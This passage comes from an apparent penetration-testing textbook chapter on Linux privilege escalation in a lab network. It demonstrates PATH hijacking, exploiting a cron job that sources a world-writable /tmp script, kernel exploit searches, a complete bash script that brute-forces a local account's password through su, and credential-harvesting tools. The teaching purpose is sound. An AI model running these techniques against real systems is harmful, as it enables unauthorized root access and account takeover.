<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_222" aria-label="222"/>This should create a new binary named <i>getuser</i>. Let’s set the executable permissions on it:</p>&#13;
<pre><code>$ <b>chmod u+x getuser</b></code></pre>&#13;
<p class="TX">Now, set the <span class="SANS_TheSansMonoCd_W5Regular_11">PATH</span> such that the current directory is prepended to it:</p>&#13;
<pre><code>$ <b>PATH="$(pwd):$PATH"</b>&#13;
$ <b>echo $PATH</b>&#13;
<b>/tmp</b>:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&#13;
</code></pre>&#13;
<p class="TX">In this output, you can see that the <i>/tmp</i> directory was prepended to the <span class="SANS_TheSansMonoCd_W5Regular_11">PATH</span>. This is because we were in the <i>/tmp</i> directory when we executed this command; your value might look different if you navigated to a different directory. Make sure that the <i>getuser</i> binary is located in whatever directory you prepended to the <span class="SANS_TheSansMonoCd_W5Regular_11">PATH</span>.</p>&#13;
<p class="TX">Since we control one of the directories in the <span class="SANS_TheSansMonoCd_W5Regular_11">PATH</span>, we can create a fake <i>whoami</i> script in that path (<a href="chapter9.xhtml#Lis9-2">Listing 9-2</a>).</p>&#13;
<span id="Lis9-2"/><pre><code>$ <b>echo "#!/bin/bash" &gt;&gt; whoami</b>&#13;
$ <b>echo "I am not the whoami you were looking for!" &gt;&gt; whoami</b>&#13;
$ <b>chmod u+x whoami</b>&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 9-2: Forging a whoami executable</span></p>&#13;
<p class="TX">The <i>getuser</i> program will look for the <span class="SANS_TheSansMonoCd_W5Regular_11">whoami</span> command in the <span class="SANS_TheSansMonoCd_W5Regular_11">PATH</span>, and since <i>/tmp</i> will be read first, it should pick up the fake program. Run <i>getuser</i> to see the result:</p>&#13;
<pre><code>$ <b>./getuser</b>&#13;
&#13;
I am not the whoami you were looking for!&#13;
root&#13;
</code></pre>&#13;
<p class="TX">As you can see, the program executed the fake <i>whoami</i> script. Note, however, that the program’s second call to <span class="SANS_TheSansMonoCd_W5Regular_11">whoami</span> executed the correct command because it specified the file’s full path.</p>&#13;
<p class="HeadAExercise"><span id="exe-17"/><span class="SANS_Futura_Std_Heavy_B_15">Exercise 17: Maliciously Modifying a Cron Job</span></p>&#13;
<p class="TNI1"><span class="Xref"><a href="chapter8.xhtml">Chapter 8</a></span> covered scheduled tasks, including where they typically reside on a filesystem and how to execute them. Scheduled tasks generally run a custom script designed to perform a desired action, and this script might reference other local files for information. Also, the script might run with elevated privileges. So, they’re an interesting avenue to explore when looking for privilege escalation vulnerabilities.</p>&#13;
<p class="TX">On <i>p-jumpbox-01</i> (172.16.10.13), take a look at the contents of the <i>/etc/ crontab</i> file:</p>&#13;
<pre><code><span role="doc-pagebreak" epub:type="pagebreak" id="pg_223" aria-label="223"/>$ <b>cat /etc/crontab</b>&#13;
&#13;
<var>--snip--</var>&#13;
*/5 * * * * root bash /scripts/backup_data.sh&#13;
</code></pre>&#13;
<p class="TX">As you can see, the command <span class="SANS_TheSansMonoCd_W5Regular_11">bash /scripts/backup_data.sh</span> runs every five minutes, using the <i>root</i> user. Let’s check whether this script is accessible to us:</p>&#13;
<pre><code>$ <b>ls -l /scripts/backup_data.sh</b>&#13;
&#13;
-rw-r--r-- 1 root root 508 Jul  4 02:50 /scripts/backup_data.sh&#13;
</code></pre>&#13;
<p class="TX">It is, so let’s take a look at the script’s contents, shown in <a href="chapter9.xhtml#Lis9-3">Listing 9-3</a>. Does anything stand out to you?</p>&#13;
<span id="Lis9-3"/><pre><code>#!/bin/bash&#13;
<span class="codeannotated_CodeAnnotation" aria-label="annotation1">❶</span> CURRENT_DATE=$(date +%y-%m-%d)&#13;
&#13;
if [[! -d "/data/backup"]]; then&#13;
  mkdir -p /data/backup&#13;
fi&#13;
&#13;
# Look for external instructions if they exist.&#13;
<span class="codeannotated_CodeAnnotation" aria-label="annotation2">❷</span> for directory in "/tmp" "/data"; do&#13;
<span class="Code_CodeAnnotation" aria-label="annotation3">❸</span> if [[-f "${directory}/extra_cmds.sh"]]; then&#13;
  <span class="Code_CodeAnnotation" aria-label="annotation4">❹</span> source "${directory}/extra_cmds.sh"&#13;
  fi&#13;
done&#13;
&#13;
# Back up the data directory.&#13;
echo "Backing up /data/backup - ${CURRENT_DATE}"&#13;
&#13;
<span class="codeannotated_CodeAnnotation" aria-label="annotation5">❺</span> tar czvf "/data/backup-${CURRENT_DATE}.tar.gz" /data/backup&#13;
rm -rf /data/backup/*&#13;
&#13;
echo "Done."&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 9-3: A data backup script</span></p>&#13;
<p class="TX">The script first sets the <span class="SANS_TheSansMonoCd_W5Regular_11">CURRENT_DATE</span> variable with today’s date <span class="CodeAnnotation" aria-label="annotation1">❶</span>. Then a <span class="SANS_TheSansMonoCd_W5Regular_11">for</span> loop iterates over the <i>/tmp</i> and <i>/data</i> directories <span class="CodeAnnotation" aria-label="annotation2">❷</span> and tests whether the file <i>extra_cmds.sh</i> exists in each directory <span class="CodeAnnotation" aria-label="annotation3">❸</span>. If the script finds the file, the <span class="SANS_TheSansMonoCd_W5Regular_11">source</span> command copies the <i>extra_cmds.sh</i> script <span class="CodeAnnotation" aria-label="annotation4">❹</span> into the currently executing script, which runs all its instructions in the same shell. Next, a <span class="SANS_TheSansMonoCd_W5Regular_11">tar</span> command compresses the contents of <i>/data/backup</i> into a single <i>tar.gz</i> file under <i>/data</i> <span class="CodeAnnotation" aria-label="annotation5">❺</span>. The script then removes any contents left in <i>/data/backup</i>.</p>&#13;
<p class="TX">This script contains a vulnerability; it doesn’t take into consideration that <i>/tmp</i> is a world-accessible directory. If the <i>extra_cmds.sh</i> file doesn’t exist, someone could potentially create one, then introduce additional instructions for the cron job to execute. In addition, the <i>/data</i> directory is also world-writable because of what seems to be a misconfiguration. Run the <span class="SANS_TheSansMonoCd_W7Bold_B_11">stat</span> (or <span class="SANS_TheSansMonoCd_W7Bold_B_11">ls</span>) command on <i>/data</i> to see the permissions set.</p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_224" aria-label="224"/>To test this vulnerability, write content to the <i>extra_cmd.sh</i> file. <a href="chapter9.xhtml#Lis9-4">Listing 9-4</a> provides a simple proof of concept.</p>&#13;
<span id="Lis9-4"/><pre><code>#!/bin/bash&#13;
&#13;
echo "The running user is: $(whoami)" &gt;&gt; /tmp/proof-of-concept&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 9-4: A proof-of-concept script to exploit the vulnerable cron job</span></p>&#13;
<p class="TX">An execution of this script by Cron will result in a new file named <i>proof-of-concept</i> under <i>/tmp</i> with the content <span class="SANS_TheSansMonoCd_W5Regular_11">The running user is:</span> followed by the output of the <span class="SANS_TheSansMonoCd_W5Regular_11">whoami</span> command, which in this case should be root.</p>&#13;
<p class="TX">Save this file and use <span class="SANS_TheSansMonoCd_W7Bold_B_11">chmod</span> to set the executable permissions on it, then wait five minutes to see the result:</p>&#13;
<pre><code>$ <b>ls -l</b>&#13;
-rwxr--r-- 1 root root 104 Jul  4 03:24 extra_cmds.sh&#13;
-rw-r--r-- 1 root root  26 Jul  4 03:25 proof-of-concept&#13;
&#13;
$ <b>cat proof-of-concept</b>&#13;
The running user is: root&#13;
</code></pre>&#13;
<p class="TX">Vulnerabilities in shell scripts aren’t rare, because they’re often written with the assumption that the operating environment does not have malicious users potentially looking for ways to exploit it. Tools called <i>linters</i>, such as ShellCheck (<i><a href="https://www.shellcheck.net">https://www.shellcheck.net</a></i>), help enforce best practices when writing shell scripts. ShellCheck also highlights potential code areas that may cause security risks due to code errors.</p>&#13;
<p class="TX">To further exploit this flaw, consider writing a new <i>extra_cmd.sh</i> that takes any of the following actions:</p>&#13;
<ul class="ul">&#13;
<li class="ListBullet">Modify a <span class="SANS_TheSansMonoCd_W5Regular_11">sudo</span> configuration to grant a user of your choice permission.</li>&#13;
<li class="ListBullet">Change the permissions to a directory of interest, such as a log directory, so that your low-privileged user has access to it.</li>&#13;
<li class="ListBullet">Copy files from other users’ home directories to a directory readable to your user.</li>&#13;
</ul>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec20">&#13;
<h2 class="H1" id="sec20"><span id="h1-79"/><span class="SANS_Futura_Std_Bold_B_11">Finding Kernel Exploits</span></h2>&#13;
<p class="TNI1">When discovered, high-profile kernel-level vulnerabilities tend to get the security industry excited and panicked at the same time. While they’re often disclosed responsibly through security disclosure channels, we sometimes learn about them only when threat actors attempt to gain privileged access by using a zero day.</p>&#13;
<blockquote>&#13;
<p class="Note"><span class="SANS_Dogma_OT_Bold_B_15">WARNING</span></p>&#13;
</blockquote>&#13;
<p class="NOTE-TXT"><i>These exploits could crash the kernel, so unless you have explicit permission from a client, you’ll want to avoid using them during penetration tests.</i></p>&#13;
<p class="TX">Kernel exploits target specific kernel versions, CPU architectures (such as x86_64 or ARM), or operating systems, so to use one, you’ll first need to <span role="doc-pagebreak" epub:type="pagebreak" id="pg_225" aria-label="225"/>analyze the system to determine the kernel version that’s running. On your Kali machine, run the following:</p>&#13;
<pre><code>$ <b>uname -r -v</b>&#13;
&#13;
6.x.x-kali5-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.x.xx-1kali2&#13;
</code></pre>&#13;
<p class="TX">You can find kernel exploits in databases such as <i><a href="https://exploit-db.com">https://exploit-db.com</a></i> by searching for the specific kernel version of interest. While this can be a manual process, automated tools aim to make this search faster and more accurate by matching the kernel’s version to a list of CVEs.</p>&#13;
<section epub:type="division" aria-labelledby="sec21">&#13;
<h3 class="H2" id="sec21"><span id="h2-142"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">SearchSploit</span></h3>&#13;
<p class="TNI1"><i>SearchsSploit</i> is a command line utility built into Kali that interfaces with Exploit-DB, allowing you to perform searches from the terminal.</p>&#13;
<p class="TX">The following command performs a search for Linux kernel exploits for the <i>Dirty COW vulnerability</i> (CVE-2016-5195), a race condition vulnerability that impacted kernel versions before 4.8.3:</p>&#13;
<pre><code>$ <b>searchsploit linux kernel | grep -i "dirty cow"</b>&#13;
&#13;
Linux Kernel - 'The Huge Dirty Cow' Overwriting The Huge Zero Page (1)&#13;
Linux Kernel - 'The Huge Dirty Cow' Overwriting The Huge Zero Page (2)&#13;
Linux Kernel 2.6.22 &lt; 3.9 (x86/x64) - 'Dirty COW /proc/self/mem' Race Condition Privilege Es...&#13;
Linux Kernel 2.6.22 &lt; 3.9 - 'Dirty COW /proc/self/mem' Race Condition Privilege Escalation&#13;
Linux Kernel 2.6.22 &lt; 3.9 - 'Dirty COW PTRACE_POKEDATA' Race Condition (Write Access Method)&#13;
Linux Kernel 2.6.22 &lt; 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation&#13;
Linux Kernel 2.6.22 &lt; 3.9 - 'Dirty COW' /proc/self/mem Race Condition (Write Access Method)&#13;
</code></pre>&#13;
<p class="TX">Other tools aim to automate the kernel exploit search by locally analyzing a system and matching the kernel version with a database of vulnerable kernels and exploits. One such tool is Linux Exploit Suggester 2.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec22">&#13;
<h3 class="H2" id="sec22"><span id="h2-143"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Linux Exploit Suggester 2</span></h3>&#13;
<p class="TNI1"><i>Linux Exploit Suggester 2</i> is a Perl script that runs locally on a system. It attempts to find exploits that match the currently running kernel version. To give it a try, run the following command against your Kali machine:</p>&#13;
<pre><code>$ <b>perl /home/kali/tools/linux-exploit-suggester-2/linux-exploit-suggester-2.pl</b>&#13;
&#13;
  #############################&#13;
    Linux Exploit Suggester 2&#13;
  #############################&#13;
&#13;
  Local Kernel: 6.x.x&#13;
  Searching 72 exploits...&#13;
&#13;
  Possible Exploits&#13;
&#13;
  No exploits are available for this kernel version&#13;
</code></pre>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_226" aria-label="226"/>Under the hood, the exploit suggester script contains a database of more than 70 kernel exploits as of this writing. Some examples include a vulnerability in OverlayFS (CVE-2015-8660) and a vulnerability in eBPF (CVE-2017-16695).</p>&#13;
</section>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec23">&#13;
<h2 class="H1" id="sec23"><span id="h1-80"/><span class="SANS_Futura_Std_Bold_B_11">Attacking Adjacent Accounts</span></h2>&#13;
<p class="TNI1">When you land on a compromised host as a nonroot user, you may want to try to escalate your privileges by attacking other system accounts. You may even be able to gain root access by compromising a nonroot account that happens to have certain privileges, such as unrestricted <span class="SANS_TheSansMonoCd_W5Regular_11">sudo</span> privileges or a certain file in the home directory containing credentials.</p>&#13;
<p class="TX">We can attempt to brute-force system accounts by using bash. First, let’s identify accounts that have an active shell by performing a <span class="SANS_TheSansMonoCd_W5Regular_11">grep</span> search for <i>/bin/bash</i> (though remember that there could be other shells as well). Execute the following command against <i>p-jumpbox-01</i> (172.16.10.13):</p>&#13;
<pre><code>$ <b>grep "/bin/bash" /etc/passwd | grep -v "backup:x"</b>&#13;
&#13;
root:x:0:0:root:/root:/bin/bash&#13;
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash&#13;
jmartinez:x:1001:1001::/home/jmartinez:/bin/bash&#13;
dbrown:x:1002:1002::/home/dbrown:/bin/bash&#13;
ogarcia:x:1003:1003::/home/ogarcia:/bin/bash&#13;
arodriguez:x:1004:1004::/home/arodriguez:/bin/bash&#13;
</code></pre>&#13;
<p class="TX">For the purpose of this example, we’ll attack the account <i>jmartinez</i>. <a href="chapter9.xhtml#Lis9-5">Listing 9-5</a> attempts to brute-force the password for that account.</p>&#13;
<span id="Lis9-5"/>&#13;
<p class="CodeLabel"><span class="codelabel_Italic">local_account _bf.sh</span></p>&#13;
<pre class="pre"><code>#!/bin/bash&#13;
<span class="codeannotated_CodeAnnotation" aria-label="annotation1">❶</span> USER="jmartinez"&#13;
<span class="codeannotated_CodeAnnotation" aria-label="annotation2">❷</span> PASSWORD_FILE="passwords.txt"&#13;
&#13;
if [[! -f "${PASSWORD_FILE}"]]; then&#13;
  echo "password file does not exist."&#13;
  exit 1&#13;
fi&#13;
&#13;
<span class="codeannotated_CodeAnnotation" aria-label="annotation3">❸</span> while read -r password; do&#13;
  echo "Attempting password: ${password} against ${USER}..."&#13;
  if echo "${password}" | timeout 0.2 su - ${USER} \&#13;
          -c 'whoami' | grep -q "${USER}"; then&#13;
    echo&#13;
    echo "SUCCESS! The password for ${USER} is ${password}"&#13;
    echo "Use su - ${USER} and provide the password to switch"&#13;
    exit 0&#13;
  fi&#13;
done &lt; "${PASSWORD_FILE}"&#13;
&#13;
echo "Unable to compromise ${USER}."&#13;
exit 1&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 9-5: Brute-forcing adjacent accounts</span></p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_227" aria-label="227"/>In this script, we set two variables: <span class="SANS_TheSansMonoCd_W5Regular_11">USER</span>, with the account name to attack <span class="CodeAnnotation" aria-label="annotation1">❶</span>, and <span class="SANS_TheSansMonoCd_W5Regular_11">PASSWORD_FILE</span>, a file that will contain a passwords list <span class="CodeAnnotation" aria-label="annotation2">❷</span>.</p>&#13;
<p class="TX">Next, we read the content of <span class="SANS_TheSansMonoCd_W5Regular_11">PASSWORD_FILE</span> by using a <span class="SANS_TheSansMonoCd_W5Regular_11">while</span> loop <span class="CodeAnnotation" aria-label="annotation3">❸</span>, iterating through each password that exists. We <span class="SANS_TheSansMonoCd_W5Regular_11">echo</span> each password to the standard output stream and pipe it to the <span class="SANS_TheSansMonoCd_W5Regular_11">su</span> command. Then we use <span class="SANS_TheSansMonoCd_W5Regular_11">su - ${USER} -c 'whoami'</span> to attempt to switch to the user and execute the <span class="SANS_TheSansMonoCd_W5Regular_11">whoami</span> command upon success.</p>&#13;
<p class="TX">If the <span class="SANS_TheSansMonoCd_W5Regular_11">whoami</span> command returns the username we’re brute-forcing in the output (<i>jmartinez</i> in this case), it means we were able to successfully guess the password and execute a command as the user. We check that it returned this string by using <span class="SANS_TheSansMonoCd_W5Regular_11">grep -q "${USER}"</span>.</p>&#13;
<p class="TX">Let’s test it. Download and save the script on the <i>p-jumpbox-01</i> machine by using the methods you’ve learned so far.</p>&#13;
<p class="TX">Next, write a few passwords to the <i>passwords.txt</i> file. Make sure this file exists in the same directory as the <i>local_account_bf.sh</i> script:</p>&#13;
<pre><code>$ <b>echo test &gt;&gt; passwords.txt</b>&#13;
$ <b>echo test123 &gt;&gt; passwords.txt</b>&#13;
$ <b>echo password123 &gt;&gt; passwords.txt</b>&#13;
$ <b>echo admin &gt;&gt; passwords.txt</b>&#13;
</code></pre>&#13;
<p class="TX">Now run the script and observe its output:</p>&#13;
<pre><code>$ <b>bash local_account_bf.sh</b>&#13;
Attempting password: test against jmartinez...&#13;
Password: Attempting password: test123 against jmartinez...&#13;
Password: Attempting password: password123 against jmartinez...&#13;
Password:&#13;
<b>SUCCESS! The password for jmartinez is password123</b>&#13;
&#13;
Use su - jmartinez and provide the password to switch&#13;
</code></pre>&#13;
<p class="TX">The password was found to be <i>password123</i>! Try switching to the user and providing the password:</p>&#13;
<pre><code>$ <b>su — jmartinez</b></code></pre>&#13;
<p class="TX">Next, you should be able to see that this user has <span class="SANS_TheSansMonoCd_W5Regular_11">sudo</span> access everywhere by running <span class="SANS_TheSansMonoCd_W7Bold_B_11">sudo -l</span>:</p>&#13;
<pre><code>$ <b>sudo -l</b>&#13;
&#13;
Matching Defaults entries for jmartinez on p-jumpbox-01:&#13;
<var>--snip--</var>&#13;
User jmartinez may run the following commands on p-jumpbox-01:&#13;
&#13;
  <b>  (ALL : ALL) ALL</b>&#13;
</code></pre>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_228" aria-label="228"/>This should give us access to the root account. To confirm we are able to switch to the root user, type the following:</p>&#13;
<pre><code>$ <b>sudo su</b>&#13;
# <b>whoami</b>&#13;
&#13;
root&#13;
</code></pre>&#13;
<p class="TX">Congratulations! You successfully compromised this machine.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec24">&#13;
<h2 class="H1" id="sec24"><span id="h1-81"/><span class="SANS_Futura_Std_Bold_B_11">Privilege Escalation with GTFOBins</span></h2>&#13;
<p class="TNI1">We can use commonly available utilities on Linux-based machines for a variety of nefarious purposes. The GTFOBins project (<i><a href="https://gtfobins.github.io">https://gtfobins.github.io</a></i>) highlights many of these utilities, and in particular, what an attacker can do with them if they have permissions such as SetUID or <span class="SANS_TheSansMonoCd_W5Regular_11">sudo</span> set. As you can see in <a href="chapter9.xhtml#fig9-3">Figure 9-3</a>, some utilities allow arbitrary file reads and writes, file downloads and uploads, reverse shells, and more.</p>&#13;
<figure class="IMG"><img id="fig9-3" class="img1" src="../images/pg228.jpg" alt=""/>&#13;
<figcaption><p class="CAP"><span class="SANS_Futura_Std_Book_Oblique_I_11">Figure 9-3: The GTFOBins home page</span></p></figcaption>&#13;
</figure>&#13;
<p class="TX">When you inspect the filesystem for <span class="SANS_TheSansMonoCd_W5Regular_11">sudo</span> access or SetUID permissions set on particular utilities or binaries, we highly recommend that you search the GTFOBins database to learn about possible attack opportunities.</p>&#13;
<p class="HeadAExercise"><span id="exe-18"/><span role="doc-pagebreak" epub:type="pagebreak" id="pg_229" aria-label="229"/><span class="SANS_Futura_Std_Heavy_B_15">Exercise 18: Mapping GTFOBins Exploits to Local Binaries</span></p>&#13;
<p class="TNI1">Can you automate your search of the GTFOBins repository? In this exercise, you’ll use bash to map the list of available utilities on a target system to those in the GTFOBins database. The GTFOBins project is hosted on GitHub, where each binary has its own Markdown documentation file (with the <i>.md</i> extension), so you’ll need your script to do the following:</p>&#13;
<p class="NLF">  1.  Perform a search for system and user binaries (in directories such as <i>/bin</i>, <i>/usr/bin</i>, and <i>/usr/sbin</i>). For the purpose of this exercise, the search should look for SetUID files.</p>&#13;
<p class="NL">  2.  Use filtering commands to extract only the filenames, without their paths.</p>&#13;
<p class="NL">  3.  Perform an HTTP GET request against the GTFOBins database to search for the correct documentation file, using the filename.</p>&#13;
<p class="NLL">  4.  Print the results to the console or to a file.</p>&#13;
<p class="TX">Your script should be able to output all exploitation methods for the binaries it found on the system with matches in the database. You can view an example GTFOBins page for the <span class="SANS_TheSansMonoCd_W5Regular_11">wget</span> binary here: <i><a href="https://raw.githubusercontent.com/GTFOBins/GTFOBins.github.io/master/_gtfobins/wget.md">https://raw.githubusercontent.com/GTFOBins/GTFOBins.github.io/master/_gtfobins/wget.md</a></i>.</p>&#13;
<p class="TX">If you get stuck, take a look at the example solution, <i>gtfobins_search.sh</i>, in the book’s GitHub repository.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec25">&#13;
<h2 class="H1" id="sec25"><span id="h1-82"/><span class="SANS_Futura_Std_Bold_B_11">Automating Privilege Escalation</span></h2>&#13;
<p class="TNI1">As you may have noticed, privilege escalation requires both time and craft. Luckily, there are scripts that aim to automate the tedious task of sifting through system directories to find misconfigurations or unhardened components.</p>&#13;
<section epub:type="division" aria-labelledby="sec26">&#13;
<h3 class="H2" id="sec26"><span id="h2-144"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">LinEnum</span></h3>&#13;
<p class="TNI1">We ran LinEnum for information gathering in <span class="Xref"><a href="chapter8.xhtml">Chapter 8</a></span>. If you use the <span class="SANS_TheSansMonoCd_W5Regular_11">-t</span> (thorough) flag to run a check, it should return details that could help you escalate your privileges, such as files that belong to the current user, hidden (dot) files, private keys, and Git credential files.</p>&#13;
<p class="TX">But the script’s output can be verbose, because it prints every finding. The <span class="SANS_TheSansMonoCd_W5Regular_11">-k</span> (keyword) option performs a system-wide search for a keyword of your choice:</p>&#13;
<pre><code>$ <b>./LinEnum.sh -t -k "P@ssw0rd"</b></code></pre>&#13;
<p class="TX">This command searches for the string <span class="SANS_TheSansMonoCd_W5Regular_11">P@ssw0rd</span> in files accessible to the current user.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec27">&#13;
<h3 class="H2" id="sec27"><span id="h2-145"/><span role="doc-pagebreak" epub:type="pagebreak" id="pg_230" aria-label="230"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">unix-privesc-check</span></h3>&#13;
<p class="TNI1">Albeit a little older, <i>unix-privesc-check</i> is another self-contained shell script that can search a system for local misconfigurations. Copy the <i>unix-privesc -check</i> script from your Kali machine (the file should be under <i>/home/kali/tools/unix-privesc-check</i> or <i>/usr/bin/unix-privesc-check</i>) to any of the compromised hosts, then run a scan using the <span class="SANS_TheSansMonoCd_W5Regular_11">standard</span> option:</p>&#13;
<pre><code>$ <b>unix-privesc-check standard</b></code></pre>&#13;
<p class="TX">The <span class="SANS_TheSansMonoCd_W5Regular_11">standard</span> option is optimized for speed and will quickly enumerate misconfigurations on the system, but it provides less comprehensive enumeration coverage. The <span class="SANS_TheSansMonoCd_W5Regular_11">detailed</span> option is more likely to catch misconfigurations in third-party software found on a host:</p>&#13;
<pre><code>$ <b>unix-privesc-check detailed</b></code></pre>&#13;
<p class="TX">You should see output similar to that of LinEnum:</p>&#13;
<pre><code><var>--snip--</var>&#13;
###########################################&#13;
Checking cron job programs aren't writable (/var/spool/cron/crontabs)&#13;
############################################&#13;
&#13;
No user crontabs found in /var/spool/cron/crontabs.  Skipping checks.&#13;
&#13;
############################################&#13;
Checking cron job programs aren't writable (/var/spool/cron/tabs)&#13;
############################################&#13;
&#13;
Directory /var/spool/cron/tabs is not present.  Skipping checks.&#13;
&#13;
############################################&#13;
Checking inetd programs aren't writable&#13;
############################################&#13;
&#13;
File /etc/inetd.conf not present.  Skipping checks.&#13;
<var>--snip--</var>&#13;
</code></pre>&#13;
<p class="TX">There are a few other privilege escalation automation tools you should be familiar with.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec28">&#13;
<h3 class="H2" id="sec28"><span id="h2-146"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">MimiPenguin</span></h3>&#13;
<p class="TNI1">MimiPenguin (<i><a href="https://github.com/huntergregal/mimipenguin">https://github.com/huntergregal/mimipenguin</a></i>) is a scanner for finding the credentials of logged-in users who are connected to Linux systems running desktop environments such as the GNOME desktop environment and display managers such as LightDM or the GNOME Display Manager. If you come from a Windows penetration-testing background, you may be familiar with Mimikatz, a popular tool to extract credentials stored <span role="doc-pagebreak" epub:type="pagebreak" id="pg_231" aria-label="231"/>in memory. MimiPenguin was created to perform equivalent tasks in the Linux world.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec29">&#13;
<h3 class="H2" id="sec29"><span id="h2-147"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Linuxprivchecker</span></h3>&#13;
<p class="TNI1">The Python-based utility Linuxprivchecker (<i><a href="https://github.com/sleventyeleven/linuxprivchecker/tree/master">https://github.com/sleventyeleven/linuxprivchecker/tree/master</a></i>), developed by Mike Czumak (<span class="LinkTwitter">T_v3rn1x</span>), performs local cleartext password searches, finds shell escape opportunities in utilities such as text editors, provides kernel exploit recommendations based on the running kernel version, searches for file and directory permission misconfigurations, and more.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec30">&#13;
<h3 class="H2" id="sec30"><span id="h2-148"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Bashark</span></h3>&#13;
<p class="TNI1">Bashark (<i><a href="https://github.com/redcode-labs/Bashark/tree/master">https://github.com/redcode-labs/Bashark/tree/master</a></i>) is a shell script developed by wintrmvte. It provides a terminal user interface with helper functions for a variety of offensive security tasks, such as the enumeration of users, port scanning, reverse shell generation, and host enumeration. Its purpose is to facilitate executing common tasks without needing to write scripts and while primarily using tools that are commonly available on Linux systems.</p>&#13;
</section>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec31">&#13;
<h2 class="H1" id="sec31"><span id="h1-83"/><span class="SANS_Futura_Std_Bold_B_11">Summary</span></h2>&#13;
<p class="TNI1">In this chapter, you learned the fundamentals of privilege escalation, explored the basic and advanced file permission features in Linux systems, then scoured the local system for misconfigurations in files and directories. You also sifted through system locations where credentials are often found and inspected the configurations of mechanisms that could lead to privilege escalation vulnerabilities, such as <span class="SANS_TheSansMonoCd_W5Regular_11">sudo</span>, <span class="SANS_TheSansMonoCd_W5Regular_11">PATH</span>, and cron jobs. Finally, you performed local brute-force attacks against other system accounts.</p>&#13;
</section>&#13;
</section>&#13;
</body></html>